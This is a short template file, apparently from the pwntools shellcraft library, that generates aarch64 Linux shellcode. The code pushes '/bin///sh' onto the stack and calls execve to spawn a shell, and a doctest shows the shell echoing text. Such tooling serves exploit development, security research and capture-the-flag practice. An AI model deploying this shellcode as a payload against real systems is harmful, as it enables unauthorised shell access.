<% from pwnlib import shellcraft as SC %>
<%docstring>
Execute a different process.

    >>> p = run_assembly(shellcraft.aarch64.linux.sh())
    >>> p.sendline(b'echo Hello')
    >>> p.recv()
    b'Hello\n'

</%docstring>
    ${SC.pushstr('/bin///sh')}
    ${SC.execve('sp', 0, 0)}
